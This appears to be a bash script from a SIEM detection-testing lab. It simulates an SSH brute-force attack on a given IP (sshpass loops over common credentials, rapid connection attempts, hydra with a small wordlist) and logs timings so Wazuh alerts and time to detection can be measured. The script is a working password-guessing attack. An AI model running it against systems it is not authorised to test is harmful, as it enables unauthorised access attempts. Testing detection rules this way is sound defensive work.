#!/bin/bash
#===============================================================================
# Attack #01: SSH Brute Force Attack
# Category: Brute Force
# Expected Wazuh Rules: 5710 (lvl5), 5712 (lvl10), 5715 (lvl3), 40112 (lvl12)
# Expected Level: 3-12 (observed)
# MITRE ATT&CK: T1110.001 (Brute Force: Password Guessing)
#===============================================================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../scripts/config.env" 2>/dev/null || true

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

ATTACK_ID="01"
ATTACK_NAME="SSH Brute Force"
ATTACK_CATEGORY="Brute Force"

# Get target IP from argument or config
TARGET="${1:-$TARGET_IP}"

if [ -z "$TARGET" ]; then
    echo -e "${RED}Error: No target IP specified${NC}"
    echo "Usage: $0 <target_ip>"
    exit 1
fi

echo "==============================================================================="
echo -e "${YELLOW}ATTACK #${ATTACK_ID}: ${ATTACK_NAME}${NC}"
echo "==============================================================================="
echo "Target: $TARGET"
echo "Category: $ATTACK_CATEGORY"
echo "Expected Rules: 5710, 5711, 5712, 5720, 5758, 5763"
echo ""

# Record start time with high precision
START_TIME=$(date +%s.%N)
START_TIMESTAMP=$(date -Iseconds)

echo -e "${GREEN}[*] Attack started at: $START_TIMESTAMP${NC}"
echo "[*] Simulating SSH brute force attack..."
echo ""

# Method 1: Manual failed SSH attempts with sshpass
echo "[*] Method 1: Failed SSH login attempts with wrong passwords"
FAKE_USERS=("admin" "root" "test" "user" "administrator" "guest")
FAKE_PASSWORDS=("password" "123456" "admin" "root" "test123" "password123")

for user in "${FAKE_USERS[@]}"; do
    for pass in "${FAKE_PASSWORDS[@]}"; do
        echo "    Trying $user:$pass"
        sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
            -o BatchMode=no -o PreferredAuthentications=password \
            "$user@$TARGET" exit 2>/dev/null &
        sleep 0.3
    done
done

# Wait for background processes
wait 2>/dev/null

echo ""
echo "[*] Method 2: Rapid connection attempts"
for i in {1..20}; do
    ssh -o StrictHostKeyChecking=no -o ConnectTimeout=1 \
        -o BatchMode=yes "fakeuser$i@$TARGET" exit 2>/dev/null &
    sleep 0.1
done

wait 2>/dev/null

# If hydra is available, use it for more realistic simulation
if command -v hydra &> /dev/null; then
    echo ""
    echo "[*] Method 3: Using Hydra for brute force simulation"
    
    # Create temporary wordlists
    TEMP_USERS=$(mktemp)
    TEMP_PASS=$(mktemp)
    
    echo -e "admin\nroot\ntest\nuser\nubuntu\nec2-user" > "$TEMP_USERS"
    echo -e "password\n123456\nadmin\nroot\ntest123\npassword123\nqwerty\nletmein" > "$TEMP_PASS"
    
    # Run hydra with limited attempts (we don't want actual success)
    timeout 30 hydra -L "$TEMP_USERS" -P "$TEMP_PASS" -t 4 -f -V \
        ssh://"$TARGET" 2>/dev/null || true
    
    # Cleanup
    rm -f "$TEMP_USERS" "$TEMP_PASS"
fi

# Record end time
END_TIME=$(date +%s.%N)
END_TIMESTAMP=$(date -Iseconds)
DURATION=$(echo "$END_TIME - $START_TIME" | bc)

echo ""
echo "==============================================================================="
echo -e "${GREEN}[✓] Attack completed${NC}"
echo "==============================================================================="
echo "End Time: $END_TIMESTAMP"
echo "Duration: ${DURATION} seconds"
echo ""
echo "Expected Wazuh alerts:"
echo "  - Rule 5710: Attempt to login using a non-existent user"
echo "  - Rule 5711: Excessive authentication failures"
echo "  - Rule 5712: Multiple authentication failures"
echo "  - Rule 5758: Maximum authentication attempts exceeded"
echo ""
echo "Next steps:"
echo "  1. Check Wazuh dashboard for alerts"
echo "  2. Record alert timestamp for MTTD calculation"
echo "  3. Document analysis and remediation times"
echo ""
echo "Data for CSV:"
echo "  attack_id: $ATTACK_ID"
echo "  attack_name: $ATTACK_NAME"
echo "  category: $ATTACK_CATEGORY"
echo "  attack_start_time: $START_TIMESTAMP"
echo "  attack_end_time: $END_TIMESTAMP"
echo "  duration_seconds: $DURATION"
